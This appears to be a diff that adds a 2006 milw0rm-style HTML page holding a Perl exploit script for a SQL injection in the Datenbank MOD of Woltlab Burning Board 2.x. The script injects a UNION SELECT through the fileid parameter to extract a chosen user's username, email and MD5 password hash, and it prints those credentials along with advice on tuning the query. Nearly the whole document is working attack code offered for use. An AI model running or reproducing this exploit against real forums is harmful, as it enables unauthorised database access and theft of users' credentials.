@@ -1,0 +1,72 @@
+<html><head><title>Woltlab Burning Board 2.x Datenbank MOD (fileid) Remote SQL Injection</title></head><pre>#!/usr/bin/perl
+#Method found &amp; Exploit scripted by nukedx
+#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Usage: wbb.pl &lt;victim&gt; &lt;directory&gt; &lt;modpage&gt; &lt;dbnum&gt; &lt;userid&gt;
+#Original Advisory: http://www.nukedx.com/?viewdoc=17
+use IO::Socket;
+if(@ARGV &lt; 5){
+print &quot;
++*************************************************************************+
++Woltlab Burning Board 2.x (Datenbank MOD fileid) Remote SQL Injection XPL+
++      Usage: wbb.pl &lt;victim&gt; &lt;directory&gt; &lt;modpage&gt; &lt;dbnum&gt; &lt;userid&gt;      +
++                Example: wbb.pl sux.com / info_db.php  1 1               +
++                  Method found &amp; Exploit scripted by nukedx              +
++*************************************************************************+
+&quot;;
+exit();
+}
+#Local variables
+$wbbserver = $ARGV[0];
+$wbbserver =~ s/(http:\/\/)//eg;
+$wbbhost = &quot;http://&quot;.$wbbserver;
+$port = &quot;80&quot;;
+$wbbdir = $ARGV[1];
+$wbbpage  = $ARGV[2];
+$wbbdbid = $ARGV[3];
+$wbbid = $ARGV[4];
+$wbbtar = $wbbpage.&quot;?action=file&amp;subkatid=1&amp;noheader=1&amp;fileid=&quot;;
+$wbbxp = &quot;-1/**/UNION/**/SELECT/**/0,0,0,username,email,0,0,0,0,0,password,0,0,0,0,0,0,0/**/FROM/**/bb&quot;.$wbbdbid.&quot;_users/**/where/**/userid=&quot;.$wbbid;
+$wbbreq = $wbbhost.$wbbdir.$wbbtar.$wbbxp;
+$tag = &quot;'s&quot;;
+#Writing data to socket
+print &quot;+**********************************************************************+\n&quot;;
+print &quot;+ Trying to connect: $wbbserver\n&quot;;
+$wbb = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$wbbserver&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
+print $wbb &quot;GET $wbbreq\n&quot;;
+print $wbb &quot;Host: $wbbserver\n&quot;;
+print $wbb &quot;Accept: */*\n&quot;;
+print $wbb &quot;Connection: close\n\n&quot;;
+print &quot;+ Connected!...\n&quot;;
+while($answer = &lt;$wbb&gt;) {
+if ($answer =~ /&lt;span class=\&quot;smallfont\&quot;&gt;&lt;b&gt;(.*?)&lt;\/b&gt; &lt;\/td&gt;/){ 
+print &quot;+ Exploit succeed! Getting USERID: $wbbid$tag login information.\n&quot;;
+print &quot;+ USERNAME: $1\n&quot;;
+}
+if ($answer =~ /([\d,a-f]{32})&lt;\/td&gt;/) { 
+print &quot;+ MD5 HASH OF PASSWORD: $1\n&quot;;
+}
+if ($answer =~ /&lt;p&gt;&lt;ul&gt;(.*?)&lt;\/ul&gt;&lt;\/td&gt;/) { 
+print &quot;+ MAIL: $1\n&quot;;
+print &quot;+ SQL Injection exploit has been succesfully finished.\n&quot;;
+print &quot;+ Woltlab runs on: $wbbhost$wbbdir\n&quot;;
+print &quot;+**********************************************************************+\n&quot;;
+exit();
+}
+if ($answer =~ /users' doesn't exist /) { 
+print &quot;+ This version of Datenbank MOD is vulnerable too but you have speficied wrong database number!\n&quot;;
+print &quot;+**********************************************************************+\n&quot;;
+exit(); 
+}
+if ($answer =~ /number of columns/) { 
+print &quot;+ This version of Datenbank MOD is vulnerable too but default query of SQL-inject doesnt work on it\n&quot;;
+print &quot;+ So please edit query by manually adding or removing null datas..\n&quot;;
+print &quot;+**********************************************************************+\n&quot;;
+exit(); 
+}
+}
+print &quot;+ Exploit failed :(\n&quot;;
+print &quot;+**********************************************************************+\n&quot;;
+
+# nukedx.com [2006-03-01]
+
+# milw0rm.com [2006-03-01]</pre></html>
